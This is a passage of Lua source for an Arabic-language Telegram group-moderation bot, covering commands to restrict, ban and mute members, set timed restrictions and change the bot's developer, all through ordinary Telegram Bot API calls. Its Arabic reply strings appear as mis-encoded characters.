if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨͺΩ ΩΨ§ΩΨͺΩΩΨ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ§ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΩΨ― β * '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","β β« ΨͺΩΩΩΩ ΨͺΩΩΨ―ΩΩ π« ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and (text:match('^ΨͺΩΩΩΨ― @(.*)') or text:match('^ΨͺΩΩΨ― @(.*)')) and ChCheck(msg) then
local username = text:match('^ΨͺΩΩΩΨ― @(.*)') or text:match('^ΨͺΩΩΨ― @(.*)')
function TkeedUser(extra,result,success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨͺΩ ΩΨ§ΩΨͺΩΩΨ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ§ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΩΨ― β * '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΩΨ―ΩΩ π« ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and (text:match('^ΨͺΩΩΩΨ― (%d+)') or text:match('^ΨͺΩΩΨ― (%d+)')) and ChCheck(msg) then
local user = text:match('ΨͺΩΩΩΨ― (%d+)') or text:match('ΨͺΩΩΨ― (%d+)')
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*β β« ΩΩΨ― ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨͺΩ ΩΨ§ΩΨͺΩΩΨ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ*')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ’ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΩΨ― β * '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΩΨ―ΩΩ π« ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end
end
--     Source Escobar     --
--         UnTkeed          --
if text ==('Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―') or text ==('Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ―') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ―ΩΩ π« ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
if text and (text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ― @(.*)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ― @(.*)')) and ChCheck(msg) then
local username = text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ― @(.*)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ― @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ―ΩΩ π« ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and (text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ― (%d+)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ― (%d+)')) and ChCheck(msg) then
local user = text:match('Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ― (%d+)') or text:match('Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ― (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ―ΩΩ π« ΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©")  
end
end 
end
--     Source Escobar     --
--         BanAll         --
if SecondSudo(msg) then
if text ==('Ψ­ΨΆΨ± ΨΉΨ§Ω') or text ==('Ψ­ΨΈΨ± ΨΉΨ§Ω') then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω*", 1, 'md')
return false 
end
if Devmfm:sismember(mustafa..'mfm:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ«Ψ§ΩΩΩ*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
Devmfm:sadd(mustafa..'mfm:BanAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and (text:match('^Ψ­ΨΆΨ± ΨΉΨ§Ω @(.*)') or text:match('^Ψ­ΨΈΨ± ΨΉΨ§Ω @(.*)')) then
local username = text:match('^Ψ­ΨΆΨ± ΨΉΨ§Ω @(.*)') or text:match('^Ψ­ΨΈΨ± ΨΉΨ§Ω @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω*", 1, 'md')
return false 
end
if Devmfm:sismember(mustafa..'mfm:SecondSudo:',result.id_) and not Sudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ«Ψ§ΩΩΩ*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
Devmfm:sadd(mustafa..'mfm:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and (text:match('^Ψ­ΨΆΨ± ΨΉΨ§Ω (%d+)') or text:match('^Ψ­ΨΈΨ± ΨΉΨ§Ω (%d+)')) then
local user = text:match('Ψ­ΨΆΨ± ΨΉΨ§Ω (%d+)') or text:match('Ψ­ΨΈΨ± ΨΉΨ§Ω (%d+)')
if tonumber(user) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω*", 1, 'md')
return false 
end
if Devmfm:sismember(mustafa..'mfm:SecondSudo:',user) and not Sudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ«Ψ§ΩΩΩ*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
Devmfm:sadd(mustafa..'mfm:BanAll:', user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ*")  
end
--     Source Escobar     --
--         MuteAll        --
if text ==('ΩΨͺΩ ΨΉΨ§Ω') then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω*", 1, 'md')
return false 
end
if Devmfm:sismember(mustafa..'mfm:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ«Ψ§ΩΩΩ*", 1, 'md')
return false 
end
Devmfm:sadd(mustafa..'mfm:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΩΨͺΩΩΩΩΩΫ π€ ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^ΩΨͺΩ ΨΉΨ§Ω @(.*)') then
local username = text:match('^ΩΨͺΩ ΨΉΨ§Ω @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω*", 1, 'md')
return false 
end
if Devmfm:sismember(mustafa..'mfm:SecondSudo:',result.id_) and not Sudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ«Ψ§ΩΩΩ*", 1, 'md')
return false 
end
if result.id_ then
Devmfm:sadd(mustafa..'mfm:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ ΩΨͺΩΩΩΩΩΫ π€ ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^ΩΨͺΩ ΨΉΨ§Ω (%d+)') then
local user = text:match('ΩΨͺΩ ΨΉΨ§Ω (%d+)')
if tonumber(user) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω*", 1, 'md')
return false 
end
if Devmfm:sismember(mustafa..'mfm:SecondSudo:',user) and not Sudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« *ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ«Ψ§ΩΩΩ*", 1, 'md')
return false 
end
Devmfm:sadd(mustafa..'mfm:MuteAll:', user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ ΩΨͺΩΩΩΩΩΫ π€ ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ*")  
end
--     Source Escobar     --
--         UnAll          --
if text ==('Ψ§ΩΨΊΨ§Ψ‘ ΨΉΨ§Ω') or text ==('Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω') then
function UnAllReply(extra, result, success)
Devmfm:srem(mustafa..'mfm:BanAll:', result.sender_user_id_)
Devmfm:srem(mustafa..'mfm:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ (Ψ§ΩΨ­ΨΈΨ± β’ Ψ§ΩΩΨͺΩ) ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ*")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and (text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΨΉΨ§Ω @(.*)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω @(.*)')) then
local username = text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΨΉΨ§Ω @(.*)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:BanAll:', result.id_)
Devmfm:srem(mustafa..'mfm:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ (Ψ§ΩΨ­ΨΈΨ± β’ Ψ§ΩΩΨͺΩ) ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ*")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and (text:match('^Ψ§ΩΨΊΨ§Ψ‘ ΨΉΨ§Ω (%d+)') or text:match('^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω (%d+)')) then
local user = text:match('Ψ§ΩΨΊΨ§Ψ‘ ΨΉΨ§Ω (%d+)') or text:match('Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω (%d+)')
Devmfm:srem(mustafa..'mfm:BanAll:', user)
Devmfm:srem(mustafa..'mfm:MuteAll:', user)
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ (Ψ§ΩΨ­ΨΈΨ± β’ Ψ§ΩΩΨͺΩ) ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ*")  
end
end
end
--     Source Escobar     --
if (text == "ΨͺΨΊΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω" or text == "ΩΩΩ ΩΩΩΩΩ Ψ§ΩΨ¨ΩΨͺ" or text == "ΨͺΨΊΩΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω" or text == "β ΨͺΨΊΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω β") and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
send(msg.chat_id_, msg.id_,'β β« ΩΨ¬Ψ¨ Ψ§ΩΨͺΨ§ΩΨ― Ψ§Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ¬Ψ―ΩΨ― Ψ’Ωΰ’ͺΨ³Ϋ§Ω start ΩΨ?Ψ§Ψ΅ Ψ§ΩΨ¨ΩΨͺ Ψ¨ΨΉΨ― Ψ°ΩΩ ΩΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ―Ω Ψ§ΩΩΨ·ΩΨ±')
Devmfm:setex(mustafa.."mfm:EditDev"..msg.sender_user_id_,300,true)
end
if Devmfm:get(mustafa.."mfm:EditDev"..msg.sender_user_id_) then
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
send(msg.chat_id_, msg.id_,'*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± ΨͺΨΊΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω*')
Devmfm:del(mustafa.."mfm:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
if dp.first_name_ ~= false then
Devmfm:del(mustafa.."mfm:EditDev"..msg.sender_user_id_)
Devmfm:set(mustafa.."mfm:NewDev"..msg.sender_user_id_,dp.id_)
if dp.username_ ~= false then DevUser = '\n*β β« Ψ§ΩΩΨΉΨ±Ω β * [@'..dp.username_..']' else DevUser = '' end
local Text = '*β β« Ψ§ΩΨ§ΩΨ―Ω β * '..dp.id_..DevUser..'\n*β β« Ψ§ΩΨ§Ψ³Ω β * ['..dp.first_name_..'](tg://user?id='..dp.id_..')\n*β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΨΉΩΩΩΨ§Ψͺ Ψ¨ΩΨ¬Ψ§Ψ­*\n*β β« Ψ§Ψ³ΨͺΨ?Ψ―Ω Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ± ΩΩΨͺΨ§ΩΩΨ― β β₯‘ *'
keyboard = {} 
keyboard.inline_keyboard = {{{text="ΩΨΉΩ",callback_data="/setyes"},{text="ΩΨ§",callback_data="/setno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"*β β« Ψ§ΩΩΨΉΩΩΩΨ§Ψͺ Ψ?Ψ§Ψ·Ψ¦Ω ΩΩ Ψ¨Ψ§ΩΨͺΨ§ΩΨ― ΩΨ§ΨΉΨ― Ψ§ΩΩΨ­Ψ§ΩΩΩ*")
Devmfm:del(mustafa.."mfm:EditDev"..msg.sender_user_id_)
end
end,nil)
return false
end
end
--     Source Escobar     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^Ψ±ΩΨΉ ΩΨ·Ω$") and not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if Devmfm:sismember(mustafa..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΩΩ ΩΨ·Ω Ψ΄Ψ±ΩΨΉ ΩΩΩ Ψ¨ΨΉΨ―πΉπ*") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ωΰ’ͺΩΨΉΩΩΫ ΩΩΩΩ° ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΨ·Ψ§ΩΩ*") 
Devmfm:sadd(mustafa..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source Escobar     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ·Ω$") and not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not Devmfm:sismember(mustafa..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΩΩ ΩΩΨ³ ΩΨ·Ω ΩΩΨͺΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ*") 
else
Devmfm:srem(mustafa..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΨ²ΩΩ°ΩΩΩΫ ΩΩ ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΨ·Ψ§ΩΩ*") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source Escobar     --
if Admin(msg) then
if text and (text:match('^ΨͺΩΩΩΨ― Ψ―ΩΩΩΩ (%d+)$') or text:match('^ΩΨͺΩ Ψ―ΩΩΩΩ (%d+)$') or text:match('^ΨͺΩΩΨ― Ψ―ΩΩΩΩ (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^ΨͺΩΩΩΨ― Ψ―ΩΩΩΩ (%d+)$') or text:match('^ΩΨͺΩ Ψ―ΩΩΩΩ (%d+)$') or text:match('^ΨͺΩΩΨ― Ψ―ΩΩΩΩ (%d+)$')
local Minutes = string.gsub(mutept, 'm', '')
local num1 = tonumber(Minutes) * 60 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ’ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΩΨ― β * '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΩΨ―ΩΩ π« ΩΩΨ―Ψ© β * "..mutept.." Ψ―") 
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end
if text and (text:match('^ΨͺΩΩΩΨ― Ψ³Ψ§ΨΉΩ (%d+)$') or text:match('^ΩΨͺΩ Ψ³Ψ§ΨΉΩ (%d+)$') or text:match('^ΨͺΩΩΨ― Ψ³Ψ§ΨΉΩ (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^ΨͺΩΩΩΨ― Ψ³Ψ§ΨΉΩ (%d+)$') or text:match('^ΩΨͺΩ Ψ³Ψ§ΨΉΩ (%d+)$') or text:match('^ΨͺΩΩΨ― Ψ³Ψ§ΨΉΩ (%d+)$')
local hour = string.gsub(mutept, 'h', '')
local num1 = tonumber(hour) * 3600 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ’ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΩΨ― β * '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΩΨ―ΩΩ π« ΩΩΨ―Ψ© β * "..mutept.." Ψ³") 
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
